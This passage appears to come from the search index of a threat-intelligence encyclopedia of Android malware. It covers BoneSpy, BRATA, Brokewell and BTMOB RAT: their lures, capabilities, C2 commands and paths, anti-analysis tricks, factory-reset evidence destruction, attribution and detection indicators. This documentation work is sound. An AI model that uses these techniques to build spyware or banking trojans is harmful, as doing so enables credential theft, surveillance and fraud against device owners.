Harvests all SMS messages Call logs Extracts call history Phone call audio Records voice calls Contacts Exfiltrates device contact list GPS location Tracks device coordinates Camera capture Takes photos via device cameras Ambient audio Records microphone audio Browser history Collects browsing data and bookmarks Notifications Intercepts and reads notifications from all apps Screenshots Captures device screen Cellular provider info Collects SIM and carrier details SMS-based control Can receive commands via SMS messages <p>BoneSpy's SMS command capability is a notable feature: operators can issue instructions to the implant through SMS, providing an out-of-band control channel that does not depend on internet connectivity.</p>"},{"location":"malware/families/bonespy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bonespy/#droidwatcher-lineage","title":"DroidWatcher Lineage","text":"<p>BoneSpy is built directly on the DroidWatcher codebase. DroidWatcher was a Russian open-source surveillance application developed between 2013 and 2014. BoneSpy retains nearly identical code structure, class names, and log messages in multiple classes related to:</p> <ul> <li>Call log database handling</li> <li>Location tracking</li> <li>SMS message storage</li> <li>Notification interception</li> <li>Browser bookmark collection</li> </ul> <p>The operators took this publicly available surveillance framework and extended it for their operational needs, similar to how GuardZoo operators forked the Dendroid RAT codebase for military-targeted surveillance in the Middle East.</p>"},{"location":"malware/families/bonespy/#architecture","title":"Architecture","text":"<p>Unlike PlainGnome, BoneSpy is a standalone single-stage application. There is no dropper, the full surveillance functionality is packaged in a single APK. This simpler architecture makes BoneSpy easier to deploy but also easier to analyze, as the complete capability set is visible through static analysis of one package.</p>"},{"location":"malware/families/bonespy/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>The initial attribution to Gamaredon was based on overlaps between BoneSpy's C2 infrastructure and known Gamaredon desktop campaigns:</p> <ul> <li>Shared use of dynamic DNS providers</li> <li>IP address overlaps between mobile C2 domains and desktop campaign infrastructure</li> </ul> <p>Lookout later determined these overlaps pointed to Sandcat rather than Gamaredon, though the two groups share operational patterns in their infrastructure management.</p>"},{"location":"malware/families/bonespy/#distribution","title":"Distribution","text":"<p>BoneSpy has never been observed on Google Play. Distribution appears to rely on targeted social engineering, directing victims to download APKs from attacker-controlled sources.</p> Lure Type Details Trojanized Telegram Fully functional Telegram app bundled with BoneSpy surveillance payload Fake Samsung Knox Impersonates Samsung's enterprise security platform Battery monitoring apps Fake battery charge monitoring utilities Photo gallery apps Disguised as photo gallery applications <p>Samples from January through September 2022 used the widest variety of trojanized app lures. The trojanized Telegram approach is particularly effective against Russian-speaking targets in Central Asia, where Telegram is a primary communication platform.</p>"},{"location":"malware/families/bonespy/#target-regions","title":"Target Regions","text":"Region Details Uzbekistan Primary target based on VirusTotal submission data Kazakhstan Secondary target Tajikistan Secondary target Kyrgyzstan Secondary target <p>Targeting aligns with Sandcat's known operational focus. Amnesty International reported in 2019 that Sandcat targeted academic and government organizations in countries neighboring Uzbekistan, as well as human rights defenders within Uzbekistan itself.</p>"},{"location":"malware/families/bonespy/#attribution","title":"Attribution","text":"<p>Lookout initially attributed BoneSpy and PlainGnome to Gamaredon (Primitive Bear/Shuckworm), a group linked to Russia's FSB, based on dynamic DNS and IP address overlaps with Gamaredon's desktop campaigns. Lookout later updated the attribution to Sandcat, an Uzbekistan-based threat actor associated with Uzbekistan's State Security Service. Sandcat was first identified in 2019. The reattribution is significant because it means these families represent Uzbekistan's mobile surveillance capability rather than Russia's, though the DroidWatcher codebase and Russian-language targeting reflect the Russian-speaking operational environment of Central Asian intelligence services.</p>"},{"location":"malware/families/bonespy/#related-families","title":"Related Families","text":"Family Relationship PlainGnome Companion family by the same operator. PlainGnome is custom-built (not based on DroidWatcher) and uses a two-stage dropper architecture, representing an evolution beyond BoneSpy's single-stage design. GuardZoo Both are state-linked surveillance tools built on open-source foundations (BoneSpy from DroidWatcher, GuardZoo from Dendroid RAT), targeting specific regional populations through social engineering rather than exploit chains. KoSpy Both are state-sponsored Android surveillance tools discovered by Lookout, targeting regional populations. KoSpy serves North Korean intelligence while BoneSpy serves Central Asian intelligence operations."},{"location":"malware/families/bonespy/#references","title":"References","text":"<ul> <li>Lookout: BoneSpy and PlainGnome Android Surveillance</li> <li>The Hacker News: Gamaredon Deploys Android Spyware BoneSpy and PlainGnome</li> <li>BleepingComputer: Russian cyberspies target Android users with new spyware</li> <li>Security Affairs: First mobile malware families linked to Gamaredon</li> <li>SecurityOnline: Gamaredon APT Deploys Two Russian Android Spyware Families</li> <li>Infosecurity Magazine: Lookout Discovers New Spyware Deployed by Russia and China</li> </ul>"},{"location":"malware/families/brata/","title":"BRATA","text":"<p>BRATA (Brazilian Remote Access Tool Android) is the banking trojan best known for factory-resetting victim devices after completing fraudulent wire transfers, destroying forensic evidence in the process. Originally targeting Brazilian users when Kaspersky first documented it in 2019, BRATA later expanded to European banking customers with increasingly aggressive capabilities. Cleafy tracked its evolution through multiple variants and ultimately reclassified the operation as an Advanced Persistent Threat. ThreatFabric later clarified that what the industry labeled \"BRATA\" was actually three distinct families: the original BRATA, AmexTroll, and Copybara.</p>"},{"location":"malware/families/brata/#overview","title":"Overview","text":"Attribute Details First Seen January 2019 Last Seen Mid-2022 (evolved into AmexTroll/Copybara) Status Original BRATA inactive; descendant families still active Type Banking trojan / RAT Attribution Unknown; Brazilian origin, later operations suggest possible Italian-speaking actors Aliases BRATA.A, BRATA.B, BRATA.C, AmexTroll Development Tool B4A (Basic4Android) framework"},{"location":"malware/families/brata/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Brata ThreatFabric BRATA / AmexTroll McAfee Android/Brata ESET Android/Spy.Brata Cleafy BRATA Trend Micro AndroidOS_Brata Dr.Web Android.BankBot.Brata Malwarebytes Android/Trojan.Spy.Brata Symantec Trojan.Gen.MBT"},{"location":"malware/families/brata/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky researchers discovered BRATA in early 2019, identifying over 20 variants hosted on the Google Play Store disguised as WhatsApp updates and other popular apps. The malware targeted exclusively Brazilian users at this stage, combining remote access capabilities with credential theft.</p> <p>McAfee documented BRATA's expansion beyond Brazil, finding variants targeting the United States and Spain while continuing to sneak past Google Play's security checks by posing as app security scanners.</p> <p>By late 2021, Cleafy identified three distinct BRATA variants (BRATA.A, BRATA.B, BRATA.C) targeting UK, Italian, and Spanish banks. The January 2022 update introducing the factory reset kill switch marked the peak of BRATA's aggressiveness. Cleafy later reclassified the operation as an APT, noting that the actors would focus on one financial institution at a time and pivot only when the target implemented effective countermeasures.</p> <p>ThreatFabric's \"tale of three families\" analysis resolved the naming confusion by demonstrating that BRATA, AmexTroll, and Copybara are separate families despite being conflated by the broader security community. All three use the B4A (Basic4Android) development framework, which became free in February 2020, roughly coinciding with the appearance of the newer variants.</p>"},{"location":"malware/families/brata/#distribution","title":"Distribution","text":"<p>BRATA's distribution methods evolved as the malware matured and expanded geographically.</p> Vector Details Google Play Original Brazilian campaigns used fake WhatsApp update and security scanner apps. McAfee found variants posing as app security scanners urging users to \"update\" Chrome, WhatsApp, or PDF readers. WhatsApp messages Lure messages distributed to Brazilian users via WhatsApp, exploiting CVE-2019-3568 as a lure theme Smishing SMS messages impersonating banks, containing links to fake download pages Sponsored search results Paid Google ads directing to BRATA download pages Phishing sites Spoofed banking portals that instruct victims to download a \"security app\" <p>The European campaigns shifted to smishing and vishing as the primary delivery method. Victims received SMS appearing to originate from their bank, followed in some cases by a phone call from an operator impersonating bank support, who guided them through installing the malware.</p>"},{"location":"malware/families/brata/#capabilities","title":"Capabilities","text":"<p>BRATA's capabilities expanded substantially across its lifecycle, from a relatively simple RAT to a full banking fraud platform with evidence destruction.</p>"},{"location":"malware/families/brata/#original-2019-brazil-focused","title":"Original (2019, Brazil-focused)","text":"Capability Implementation Screen capture Real-time screen recording and streaming Keylogging Capture keystrokes via accessibility service Remote interaction Tap, swipe, and type on victim device remotely App listing Enumerate installed applications Device unlock Capture and replay PIN/pattern/password to unlock device Phishing overlays Display fake banking login pages over legitimate apps"},{"location":"malware/families/brata/#european-expansion-late-2021","title":"European Expansion (Late 2021)","text":"<p>Cleafy documented three variants with distinct targeting:</p> Variant Targets Distinguishing Feature BRATA.A UK, Italy, Spain GPS tracking, device admin abuse, full overlay injects BRATA.B Italy Dedicated phishing page for one specific Italian bank BRATA.C Italy Dropper-based delivery, installs secondary payload"},{"location":"malware/families/brata/#kill-switch-update-january-2022","title":"Kill Switch Update (January 2022)","text":"<p>Cleafy's analysis of the factory reset capability documented these additions:</p> Capability Implementation Factory reset (kill switch) Wipes device to factory defaults after successful wire transfer or when analysis is detected GPS tracking Continuous location monitoring of infected devices HTTP/WebSocket C2 WebSocket protocol added alongside HTTP for command delivery Keylogging Enhanced keystroke capture across all applications SMS interception Read and forward SMS for OTP capture Device admin Abuse BIND_DEVICE_ADMIN to prevent uninstallation and enable factory reset"},{"location":"malware/families/brata/#apt-phase-mid-2022","title":"APT Phase (Mid-2022)","text":"<p>Cleafy's APT reclassification report noted behavioral shifts:</p> Behavior Details Targeted focus Attacks concentrated on one financial institution at a time Adaptive pivoting Shifted targets when banks deployed countermeasures Infrastructure rotation Frequent C2 domain changes Improved evasion Additional obfuscation and anti-analysis techniques"},{"location":"malware/families/brata/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/brata/#factory-reset-as-evidence-destruction","title":"Factory Reset as Evidence Destruction","text":"<p>The factory reset mechanism is BRATA's signature technique. The C2 sends a <code>byebye_format</code> command that triggers the device's built-in factory reset via device admin privileges. This fires in two scenarios:</p> <ol> <li>After a successful fraudulent wire transfer, to eliminate traces of the malware and the transaction</li> <li>When the malware detects it is running in a virtual environment or analysis sandbox</li> </ol> <p>The victim loses all data on the device, making forensic recovery extremely difficult. From the attacker's perspective, this buys time before the fraud is discovered, as the victim must first deal with a wiped device before they can check their bank account.</p>"},{"location":"malware/families/brata/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>BRATA uses the Android accessibility service for:</p> <ol> <li>Capturing screen content and keystrokes</li> <li>Auto-granting runtime permissions (SMS, phone, storage)</li> <li>Detecting foreground applications to trigger overlays</li> <li>Performing automated gestures for remote device control</li> <li>Preventing navigation to device settings for uninstallation</li> </ol>"},{"location":"malware/families/brata/#c2-communication","title":"C2 Communication","text":"<p>Early BRATA variants used standard HTTP POST for C2 communication. The January 2022 update added WebSocket support:</p> Protocol Usage HTTP POST Registration, data exfiltration, inject retrieval WebSocket Real-time command delivery for interactive sessions <p>Key C2 commands:</p> Command Action <code>screen_capture</code> Capture and stream device screen <code>byebye_format</code> Factory reset the device <code>whoami</code> Retrieve device information and state <code>sentSMS</code> Send SMS from victim device <code>getContacts</code> Exfiltrate contact list <code>startApp</code> Launch specified application"},{"location":"malware/families/brata/#b4a-framework","title":"B4A Framework","text":"<p>BRATA and its related families (AmexTroll, Copybara) are built using Basic4Android (B4A), a rapid Android development framework based on a BASIC-like language. B4A generates standard APKs but produces a distinctive code structure that is identifiable during static analysis. The framework became free in February 2020, lowering the barrier for adoption.</p>"},{"location":"malware/families/brata/#anti-analysis","title":"Anti-Analysis","text":"Technique Method String obfuscation Encrypted strings resolved at runtime Emulator detection Checks build properties and hardware characteristics Country/language check Verifies device locale matches target region, refuses to run otherwise Commercial packer Later variants wrapped in commercial packing solutions Factory reset on detection Wipes device if sandbox/analysis environment is detected"},{"location":"malware/families/brata/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>BRATA's geographic scope expanded dramatically from its Brazilian origins.</p> Phase Regions Targets 2019 (Original) Brazil Brazilian banking apps, primarily via Google Play lures 2020 (Expansion) USA, Spain Banking apps, delivered through Play Store security scanner fakes Late 2021 (Europe) UK, Italy, Spain Major European banks, with Italy as primary focus 2022 (APT phase) Italy, Poland, Latin America Concentrated single-institution targeting <p>Italian banks were the heaviest targets during the European phase. BRATA.B was built specifically for a single Italian banking institution, demonstrating the level of targeting precision the operators achieved.</p>"},{"location":"malware/families/brata/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2019: Kaspersky identified BRATA targeting Brazilian users via fake WhatsApp updates on Google Play, with over 20 variants discovered.</p> <p>2020: McAfee reported BRATA variants on Google Play targeting US and Spanish users, disguised as app security scanners that urged victims to install fake updates for Chrome, WhatsApp, and PDF readers.</p> <p>Late 2021: Cleafy detected three new BRATA variants (A, B, C) targeting European banking customers in the UK, Italy, and Spain, with new GPS tracking and overlay capabilities.</p> <p>January 2022: Cleafy published the factory reset analysis, revealing the <code>byebye_format</code> kill switch that wipes devices after fraud completion. The finding attracted widespread media coverage as the first banking trojan to systematically destroy evidence on victim devices.</p> <p>Mid-2022: Cleafy reclassified BRATA as an APT, noting the operators' shift to targeted single-institution attacks with infrastructure rotation and adaptive pivoting when countermeasures were deployed.</p> <p>June 2022: ThreatFabric published \"BRATA: a tale of three families\", clarifying that the \"BRATA\" label covered three distinct families: the original BRATA, AmexTroll (which expanded to UK and Australian targets), and Copybara (which focused on Italian banks with MQTT-based C2). All three used the B4A development framework.</p>"},{"location":"malware/families/brata/#references","title":"References","text":""},{"location":"malware/families/brokewell/","title":"Brokewell","text":"<p>Brokewell is an Android banking trojan discovered by ThreatFabric in April 2024 that combines extensive data-stealing capabilities with full remote-control functionality. Attributed to a developer operating under the alias \"Baron Samedit Marais\" through an entity called \"Brokewell Cyber Labs,\" the malware is distributed through fake browser update pages impersonating Google Chrome. Under rapid and active development with new commands added almost daily, Brokewell represents a significant emerging threat to mobile banking security, with reverse engineering revealing code-level connections to the Herodotus banking trojan.</p>"},{"location":"malware/families/brokewell/#overview","title":"Overview","text":"Attribute Details First Seen April 2024 Status Active, under rapid development Type Banking trojan, data stealer, RAT Aliases None known Attribution \"Baron Samedit Marais\" / \"Brokewell Cyber Labs\" Distribution Fake Chrome update pages, fake ID Austria app, fake Klarna app"},{"location":"malware/families/brokewell/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Brokewell in April 2024 while analyzing a fake Chrome browser update page designed to trick users into downloading a malicious APK. Investigation of the sample revealed a previously undocumented malware family with a broad range of capabilities that appeared to be under very active development.</p> <p>Attribution traces back to an individual using the alias \"Baron Samedit Marais,\" who operates under the name \"Brokewell Cyber Labs.\" ThreatFabric identified this developer through artifacts left in the malware's code and associated infrastructure. The developer maintained a public repository of tools, suggesting confidence in operating openly within the underground ecosystem.</p> <p>Reverse engineering of Brokewell revealed shared obfuscation techniques and code structures with Herodotus, a MaaS banking trojan discovered later in October 2025. Herodotus dynamically loads a Brokewell module at runtime, establishing a direct code-level connection between the two families. Despite these links, Herodotus is attributed to a different threat actor (\"K1R0\"), indicating that Brokewell's codebase has been adopted or licensed by other operators rather than representing a simple rebrand.</p>"},{"location":"malware/families/brokewell/#distribution","title":"Distribution","text":"Vector Details Fake Chrome updates Phishing pages mimicking Google Chrome's update interface Fake ID Austria app Impersonates Austria's digital identity application Fake Klarna app Impersonates the Klarna shopping and payments platform <p>ThreatFabric documented the primary distribution method as fake browser update pages that closely replicate the legitimate Chrome update flow. Victims encounter these pages through malicious redirects or phishing links and are prompted to download what appears to be a critical browser update. The malware has also been observed masquerading as the ID Austria digital identity app and the Klarna financial services app, indicating the operators tailor their lures to specific regional targets.</p>"},{"location":"malware/families/brokewell/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/brokewell/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based inject screens triggered when target banking apps are opened Cookie theft Launches a WebView loading the target site, then extracts session cookies after authentication Audio recording Captures ambient audio from the device microphone Screenshot capture Takes screenshots of the current display on demand Device location Collects GPS coordinates and location data SMS access Reads and exfiltrates SMS messages stored on the device Call log access Harvests call history including numbers, durations, and timestamps Event logging Records all accessibility events including taps, swipes, text input, and app interactions Remote control Full interactive device control via screen streaming and command execution"},{"location":"malware/families/brokewell/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Event logging, credential capture, remote UI interaction SYSTEM_ALERT_WINDOW Overlay injection windows over banking apps READ_SMS SMS exfiltration READ_CONTACTS Contact list harvesting READ_CALL_LOG Call history exfiltration READ_PHONE_STATE Device fingerprinting CAMERA Screenshot capture RECORD_AUDIO Ambient audio recording ACCESS_FINE_LOCATION GPS location tracking INTERNET C2 communication FOREGROUND_SERVICE Persistent background service RECEIVE_BOOT_COMPLETED Restart after reboot REQUEST_INSTALL_PACKAGES Loader installs main payload WAKE_LOCK Keep device awake during remote sessions"},{"location":"malware/families/brokewell/#data-theft","title":"Data Theft","text":"<p>Brokewell's data-stealing capabilities extend well beyond traditional banking trojans. The malware logs every interaction the victim makes with the device through accessibility event monitoring, capturing text typed into any app, elements displayed on screen, and applications opened. This comprehensive event logging builds a complete picture of the victim's device usage.</p> <p>The cookie theft mechanism is particularly notable. Rather than intercepting cookies in transit, Brokewell launches its own WebView instance pointed at a target site (such as accounts.google.com), allows the victim to authenticate normally, then extracts the session cookies from the WebView. This gives operators authenticated session tokens they can use to access victim accounts from their own infrastructure.</p>"},{"location":"malware/families/brokewell/#remote-control","title":"Remote Control","text":"<p>The remote access module provides operators with full interactive control of the infected device:</p> <ol> <li>Screen streaming transmits the device display to the operator in real time</li> <li>Touch simulation allows the operator to perform taps and swipes at arbitrary coordinates</li> <li>Text input enables the operator to type into any field on the device</li> <li>Scroll and navigation commands let the operator move through apps and menus</li> <li>Hardware button simulation triggers back, home, and recent apps actions</li> </ol>"},{"location":"malware/families/brokewell/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/brokewell/#loader-architecture","title":"Loader Architecture","text":"<p>ThreatFabric's analysis revealed that Brokewell uses a loader to bypass Android 13+ restrictions on accessibility service permissions for sideloaded apps. The loader installs the main payload and requests the necessary permissions, working around the protections Google introduced to prevent sideloaded applications from gaining accessibility access.</p>"},{"location":"malware/families/brokewell/#rapid-development-cycle","title":"Rapid Development Cycle","text":"<p>One of Brokewell's most distinguishing characteristics is its development velocity. ThreatFabric observed new commands and capabilities being added to the malware almost daily, with each new version expanding the command set. This cadence suggests a dedicated developer actively building out the platform rather than maintaining a stable, mature product.</p>"},{"location":"malware/families/brokewell/#c2-communication","title":"C2 Communication","text":"<p>The malware communicates with its command-and-control infrastructure to receive commands, exfiltrate stolen data, and stream the device screen for remote access sessions. Configuration and targeting data, including overlay inject pages for banking apps, are served from the C2.</p>"},{"location":"malware/families/brokewell/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTPS for command polling and data exfiltration Screen streaming Real-time device display streamed to operator panel Overlay delivery Inject HTML templates served from C2 for WebView rendering Cookie exfiltration Session cookies from WebView instances transmitted to C2 Command dispatch Growing command set expanded near-daily during active development Attribution artifacts Developer maintained public repository of tooling linked to \"Brokewell Cyber Labs\""},{"location":"malware/families/brokewell/#target-regions","title":"Target Regions","text":"Period Primary Targets April 2024 Austrian banking users (ID Austria lure) 2024 European banking users broadly (Chrome update, Klarna lures) <p>The initial campaigns used lures specific to Austrian users (the ID Austria digital identity app), but the Chrome update and Klarna lures indicate broader European targeting. Given the rapid development pace and expanding feature set, the target scope is expected to grow as the malware matures.</p>"},{"location":"malware/families/brokewell/#notable-campaigns","title":"Notable Campaigns","text":"<p>April 2024: ThreatFabric disclosed Brokewell after discovering it distributed through fake Chrome update pages. Analysis revealed a fully functional banking trojan with data-stealing and remote-control capabilities under rapid development. The developer was identified as \"Baron Samedit Marais\" operating \"Brokewell Cyber Labs,\" with a public repository of tooling associated with the operation.</p> <p>2024 (ongoing): Continued development with near-daily updates expanding the command set and capability matrix. Additional distribution lures including fake ID Austria and Klarna apps were identified, demonstrating campaign diversification alongside technical development.</p> <p>October 2025: ThreatFabric documented Herodotus, a MaaS banking trojan attributed to a different actor (\"K1R0\") that dynamically loads a Brokewell module at runtime. This confirmed that Brokewell's codebase had been adopted or licensed by other operators, extending its reach beyond the original developer.</p>"},{"location":"malware/families/brokewell/#evolution","title":"Evolution","text":"Phase Period Key Changes Initial April 2024 Full banking trojan with overlays, cookie theft, audio recording, screen streaming, remote control Rapid iteration Mid-2024 Near-daily command additions, lure diversification (ID Austria, Klarna) Codebase adoption October 2025 Herodotus loads Brokewell module, establishing cross-family code reuse"},{"location":"malware/families/brokewell/#detection","title":"Detection","text":"Indicator Type Details Comprehensive accessibility logging App logging all accessibility events (taps, swipes, text input, app switches) Cookie theft WebView App launching WebViews for authentication sites (accounts.google.com) without user-visible browser UI Audio recording Background microphone access from a browser update or utility app Screen streaming Persistent outbound data consistent with screen capture streaming Loader behavior APK bypassing Android 13+ accessibility restrictions for sideloaded applications Fake update UI Chrome update page rendered in a WebView prompting APK download"},{"location":"malware/families/brokewell/#related-families","title":"Related Families","text":"Family Relationship Herodotus Shares obfuscation techniques and code structures. Herodotus dynamically loads a Brokewell module, establishing direct code-level links between the two families. Octo Both pioneer screen streaming for on-device fraud. Octo uses MediaProjection at 1 fps; Brokewell uses a comparable approach with accessibility event logging for richer context. Hook Both combine overlay attacks with full remote device control, though Hook derives from the Cerberus lineage while Brokewell is independently developed. Vultur Both use screen recording/streaming for remote access, with Vultur pioneering the approach via AlphaVNC."},{"location":"malware/families/brokewell/#references","title":"References","text":"<ul> <li>ThreatFabric - Brokewell: Do Not Go Broke by New Banking Malware (April 2024)</li> </ul>"},{"location":"malware/families/btmob/","title":"BTMOB RAT","text":"<p>BTMOB RAT is an Android remote access trojan sold as Malware-as-a-Service, evolved from the SpySolr malware (itself based on CraxRAT). Cyble Research and Intelligence Labs (CRIL) published the initial analysis on January 31, 2025, after identifying approximately 15 samples of version 2.5 spreading through phishing sites mimicking the Turkish streaming platform iNat TV and fake cryptocurrency mining services. BTMOB abuses Android's Accessibility Services for credential harvesting, uses WebView-based phishing overlays for login capture, monitors the clipboard for cryptocurrency addresses and passwords, and leverages the Media Projection API for live screen streaming. The threat actor behind BTMOB, tracked as \"evlf_dev,\" actively markets the RAT through Telegram with a tiered licensing model and continuous version updates, with rapid iteration from v2.5 to v4 within a single year.</p>"},{"location":"malware/families/btmob/#overview","title":"Overview","text":"Attribute Details First Seen January 2025 (CRIL identification) Status Active, rapid version iteration (v2.5 through v4 in 2025) Type RAT (MaaS) Attribution \"evlf_dev\" (Telegram-based threat actor) Aliases BT-MOB, BTMob Lineage Evolved from SpySolr, which derives from CraxRAT Pricing $5,000 lifetime license + $300/month updates; $7,000 custom build with private server; $10,000 full source code"},{"location":"malware/families/btmob/#origin-and-lineage","title":"Origin and Lineage","text":"<p>BTMOB descends from SpySolr, an Android RAT that itself derived from CraxRAT, developed by the threat actor EVLF. Cyble's analysis confirmed the lineage through shared C2 structures and codebase patterns, with VirusTotal detections flagging early BTMOB samples under SpySolr signatures. The progression from CraxRAT to SpySolr to BTMOB represents incremental refinement of the same core architecture rather than a ground-up rewrite.</p> <p>The threat actor markets BTMOB through a dedicated Telegram channel, offering tiered licensing: a $5,000 one-time payment for a lifetime license with $300 monthly update fees, $7,000 for a custom version with a private server and admin panel, and $10,000 for the complete source code. This pricing positions BTMOB in the mid-range of the Android MaaS market, below premium offerings like Hook (pre-leak: $7,000/month) but above budget RATs.</p> <p>D3Lab obtained a leaked archive containing the complete BTMOB development toolkit: Android payload source code, dropper, builder environment, Windows operator panel (BTMob.exe), C2 backend, and all dependencies required for full platform deployment. This leak enabled deep analysis of the operator-side infrastructure.</p>"},{"location":"malware/families/btmob/#distribution","title":"Distribution","text":"Vector Details Phishing sites (streaming) Fake iNat TV pages (Turkish streaming platform) serving trojanized APKs Phishing sites (crypto) Fake cryptocurrency mining platforms distributing BTMOB as mining apps Telegram channels Direct distribution through the threat actor's Telegram presence Third-party APK sites Hosted on unofficial Android app repositories <p>The phishing sites are crafted to appear as legitimate download pages. Cyble documented a sample distributed through a site impersonating iNat TV, where the victim downloads what appears to be a streaming application. On installation, the app requests Accessibility Service permissions through a persistent prompt that loops until the user complies.</p>"},{"location":"malware/families/btmob/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/btmob/#credential-harvesting","title":"Credential Harvesting","text":"Technique Implementation WebView injection The <code>brows</code> command loads arbitrary URLs or dynamically injected HTML into an invisible WebView, driving JavaScript-based harvesting of form inputs Transparent overlays Draws transparent or semi-transparent overlays on banking and payment apps to capture credentials without the victim's awareness Accessibility keylogging Captures keystrokes across all applications via Accessibility Service event monitoring Lock screen capture Intercepts lock screen PIN/pattern input through overlay interception <p>The <code>brows</code> command is the primary credential theft mechanism. The C2 server can instruct BTMOB to load any URL or inject custom HTML into a hidden WebView, then use JavaScript to extract form field contents as the victim types. This allows operators to target any login page dynamically without pre-built overlay kits.</p>"},{"location":"malware/families/btmob/#device-control","title":"Device Control","text":"Capability Implementation Live screen streaming Media Projection API captures real-time screen content and streams to C2 Remote interaction Accessibility Service translates operator commands into taps, swipes, and text input File management Browse, download, and upload files on the device Audio recording Ambient audio capture via device microphone Device unlock Remote unlock through Accessibility-based gesture replay App management Install, uninstall, and launch applications remotely"},{"location":"malware/families/btmob/#data-collection","title":"Data Collection","text":"Category Details Clipboard monitoring Continuously monitors clipboard for cryptocurrency wallet addresses, passwords, and OTPs Device fingerprint IMEI, model, OS version, carrier info, battery status Installed applications Enumerates all packages on the device Contacts Full address book exfiltration SMS Read and intercept SMS messages for OTP theft Call logs Call history extraction Location GPS coordinates and network-based positioning"},{"location":"malware/families/btmob/#notification-and-persistence","title":"Notification and Persistence","text":"Technique Details Notification suppression Auto-hides notifications to conceal malicious activity from the user Accessibility persistence Monitors for attempts to disable Accessibility Service and re-enables it Permission auto-grant Uses Accessibility to silently grant runtime permissions without user interaction Auto-update RAT can update itself from C2 without user intervention"},{"location":"malware/families/btmob/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/btmob/#c2-communication","title":"C2 Communication","text":"<p>BTMOB uses WebSocket for real-time bidirectional communication with the C2 server, enabling persistent command-and-control without polling delays.</p> Aspect Details Protocol WebSocket for command/control, HTTP for bulk data exfiltration Authentication Bot identifies via device ID and bot ID on WebSocket connection C2 path structure Backend hosted under <code>/yaarsa/</code> directory with <code>user/</code>, <code>private/</code>, and <code>private/updates/</code> paths Operator panel BTMob.exe (Windows), authenticates via email, password, and token from the C2 web interface at <code>/yaarsa/user/</code> Endpoint signatures <code>yarsap_*.php</code> endpoints under <code>/yaarsa/private/</code> for plugin and update delivery"},{"location":"malware/families/btmob/#operator-panel","title":"Operator Panel","text":"<p>D3Lab's analysis of the leaked toolkit revealed that BTMob.exe is a graphical shell around the C2 APIs and WebSocket channels. It displays infected devices, provides real-time screen viewing, allows remote interaction, and manages command execution. The operator authenticates against the C2 web interface and receives a session token for API access.</p>"},{"location":"malware/families/btmob/#version-evolution","title":"Version Evolution","text":"Version Key Changes v2.5 Updated APK SDK to Android 14, removed sticky notifications, fixed lock screen capture, auto-grants full file access, HTML APK injection v3.0 Auto RAT updates, full permission support for Android 14/15, improved encryption, live location tracking v3.2 Improved accessibility installation method, auto-hide notifications v3.6 Monthly subscription model introduced v4.0 Latest version with expanded feature set <p>The rapid iteration cycle from v2.5 (January 2025) through v4.0 (late 2025) demonstrates active development. Each version addresses Android OS updates (particularly permission model changes in Android 14 and 15) and adds operator-requested features.</p>"},{"location":"malware/families/btmob/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>BTMOB's Accessibility Service performs multiple functions simultaneously:</p> <ol> <li>Monitors foreground application changes to trigger overlay attacks</li> <li>Auto-grants runtime permissions during installation without user interaction</li> <li>Captures keystrokes across all applications</li> <li>Translates remote operator commands into on-device gestures for Device Take Over</li> <li>Prevents the user from navigating to settings to disable the service</li> <li>Reads screen content for data harvesting when overlays are not deployed</li> </ol>"},{"location":"malware/families/btmob/#target-regions","title":"Target Regions","text":"Region Distribution Method Turkey Primary target via iNat TV phishing sites Global (crypto users) Fake mining platform phishing sites Global (MaaS customers) Operators deploy against their own target regions <p>As a MaaS product, BTMOB's ultimate target set depends on the individual operator purchasing the license. The developer's own campaigns focus on Turkish users through the iNat TV lure, but purchased instances target whatever region and user base the operator chooses.</p>"},{"location":"malware/families/btmob/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>January 31, 2025: Cyble Research and Intelligence Labs publishes the first public analysis of BTMOB RAT v2.5, identifying approximately 15 samples and documenting distribution through phishing sites impersonating iNat TV and cryptocurrency mining platforms. CRIL establishes the SpySolr/CraxRAT lineage.</p> <p>February 2025: The Cyber Express, Security Online, and Broadcom publish follow-up coverage and detection advisories.</p> <p>2025: D3Lab publishes \"Inside BTMOB\", a deep analysis of a leaked archive containing the complete BTMOB development toolkit. The analysis documents the C2 backend structure, operator panel authentication flow, WebSocket communication patterns, and the <code>/yaarsa/</code> infrastructure signatures that enable defensive detection.</p> <p>Late 2025: BTMOB reaches v4.0 with expanded capabilities and a growing operator base. ANY.RUN tracks increasing sample submissions as the MaaS ecosystem grows.</p>"},{"location":"malware/families/btmob/#related-families","title":"Related Families","text":"Family Relationship Hook Both are Android MaaS RATs with screen streaming, remote device interaction, and WebSocket C2 communication. Hook is more mature with a larger operator base following its source code leak. BTMOB is newer and still commercially licensed. Ermac Both occupy the Android MaaS market with overlay-based credential theft and Accessibility Service abuse. Ermac focuses on banking overlays while BTMOB emphasizes WebView injection and general-purpose RAT functionality. Octo Both provide live screen streaming and remote device control for on-device fraud. Octo uses VNC-like accessibility streaming while BTMOB leverages Media Projection API. SpySolr Direct predecessor to BTMOB, sharing C2 structure and core codebase. SpySolr itself derives from CraxRAT (by threat actor EVLF)."},{"location":"malware/families/btmob/#references","title":"References","text":""},{"location":"malware/families/cerberus/","title":"Cerberus","text":"<p>Cerberus was the Android banking trojan whose 2020 source code leak became the single most consequential event in mobile malware history. Sold as Malware-as-a-Service (MaaS) from mid-2019 through mid-2020, it introduced a polished rental model to a market previously dominated by Anubis. When the operation collapsed and its source hit underground forums, it seeded an entire lineage of successors: Alien, Ermac, Hook, and dozens of unnamed forks that persist today.</p>"},{"location":"malware/families/cerberus/#overview","title":"Overview","text":"Attribute Details First 